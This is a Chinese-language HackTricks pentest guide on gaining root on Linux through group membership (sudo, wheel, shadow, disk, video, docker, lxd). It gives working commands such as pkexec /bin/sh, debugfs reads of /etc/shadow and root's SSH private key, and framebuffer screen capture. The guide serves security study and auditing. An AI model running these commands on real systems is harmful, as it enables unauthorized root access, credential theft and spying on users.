{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin Groups

## **PE - 方法 1**

**有时**，**默认情况下（或因为某些软件需要它）**在 **/etc/sudoers** 文件中你可以找到一些这样的行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着 **任何属于 sudo 或 admin 组的用户都可以以 sudo 身份执行任何操作**。

如果是这种情况，要 **成为 root，你只需执行**：
```text
sudo su
```
## PE - 方法 2

查找所有 suid 二进制文件，并检查是否存在二进制文件 **Pkexec**：
```bash
find / -perm -4000 2>/dev/null
```
如果你发现二进制文件 pkexec 是一个 SUID 二进制文件，并且你属于 sudo 或 admin 组，你可能可以使用 pkexec 作为 sudo 执行二进制文件。检查以下内容：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
您将找到哪些组被允许执行 **pkexec**，并且在某些 Linux 中，**默认情况下**可能会出现一些 **sudo 或 admin** 组。

要 **成为 root，您可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果您尝试执行 **pkexec** 并且收到此 **错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你没有通过 GUI 连接**。对此问题有一个解决方法在这里: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh 会话**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**有时**，**默认情况下**在 **/etc/sudoers** 文件中可以找到这一行：
```text
%wheel	ALL=(ALL:ALL) ALL
```
这意味着 **任何属于 wheel 组的用户都可以以 sudo 身份执行任何操作**。

如果是这样，要 **成为 root，你只需执行**：
```text
sudo su
```
# Shadow Group

来自 **group shadow** 的用户可以 **读取** **/etc/shadow** 文件：
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，阅读文件并尝试**破解一些哈希**。

# 磁盘组

这个权限几乎**等同于根访问**，因为您可以访问机器内部的所有数据。

文件：`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用 debugfs 你也可以 **写入文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，你可以这样做：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
然而，如果你尝试**写入由 root 拥有的文件**（如 `/etc/shadow` 或 `/etc/passwd`），你将会遇到“**权限被拒绝**”错误。

# 视频组

使用命令 `w` 你可以找到**谁已登录系统**，它将显示如下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 物理上登录** 到机器上的一个终端。

**video group** 有权限查看屏幕输出。基本上，你可以观察屏幕。为了做到这一点，你需要 **抓取当前屏幕上的图像** 的原始数据，并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0`，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到该屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开** **原始图像**，您可以使用**GIMP**，选择**`screen.raw`**文件，并选择文件类型为**原始图像数据**：

![](../../images/image%20%28208%29.png)

然后将宽度和高度修改为屏幕上使用的值，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：

![](../../images/image%20%28295%29.png)

# Root Group

看起来默认情况下**root组的成员**可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些都可以用来提升权限...

**检查root成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker 组

您可以将主机的根文件系统挂载到实例的卷中，因此当实例启动时，它会立即加载一个 `chroot` 到该卷。这实际上使您在机器上获得了 root 权限。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd 组

[lxc - 权限提升](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
